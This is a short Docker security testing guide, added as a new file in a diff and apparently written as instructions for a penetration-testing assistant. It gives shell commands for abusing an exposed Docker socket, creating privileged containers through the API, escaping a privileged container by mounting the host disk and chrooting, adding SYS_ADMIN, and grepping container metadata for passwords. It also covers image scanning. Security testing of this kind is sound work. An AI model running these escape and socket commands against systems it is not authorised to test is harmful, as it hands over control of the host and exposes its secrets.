@@ -1,0 +1,83 @@
+<docker_security_guide>
+<title>DOCKER SECURITY TESTING</title>
+
+<critical>Docker security testing covers socket exposure, container escape, privileged containers, image vulnerabilities, registry security, and API attacks. Critical for containerized applications.</critical>
+
+<scope>
+- Docker socket exposure (/var/run/docker.sock)
+- Container escape techniques
+- Privileged container exploitation
+- Image vulnerability scanning
+- Registry security
+- Docker API attacks
+- Secrets in environment variables
+- Capability abuse
+</scope>
+
+<methodology>
+1. Check for Docker socket exposure
+2. Test for privileged containers
+3. Attempt container escape
+4. Scan images for vulnerabilities
+5. Test Docker API security
+6. Check for exposed secrets
+</methodology>
+
+<socket_exposure>
+{% raw %}
+# Docker socket exposure:
+ls -la /var/run/docker.sock
+# If accessible, can control Docker daemon
+
+# Exploit via curl:
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+# Create privileged container:
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["sh"],"Privileged":true}' \
+  http://localhost/containers/create
+
+# Container escape via socket:
+docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh
+# Inside container, control host Docker
+{% endraw %}
+</socket_exposure>
+
+<container_escape>
+{% raw %}
+# Privileged container escape:
+docker run --privileged -it alpine sh
+# Mount host filesystem:
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+chroot /mnt/host
+
+# Capability abuse:
+# CAP_SYS_ADMIN allows escape
+docker run --cap-add=SYS_ADMIN -it alpine sh
+
+# cgroup escape:
+# Exploit cgroup notifications
+{% endraw %}
+</container_escape>
+
+<common_payloads>
+{% raw %}
+# Socket access:
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+# Privileged escape:
+mkdir /mnt/host && mount /dev/sda1 /mnt/host
+
+# Secrets in env:
+docker inspect <container_id> | grep -i password
+
+# Image vulnerabilities:
+docker scan image:tag
+trivy image image:tag
+{% endraw %}
+</common_payloads>
+
+<remember>Docker security: Check socket exposure (full control), test privileged containers (easy escape), scan images for CVEs, look for secrets in environment variables, validate API authentication.</remember>
+</docker_security_guide>
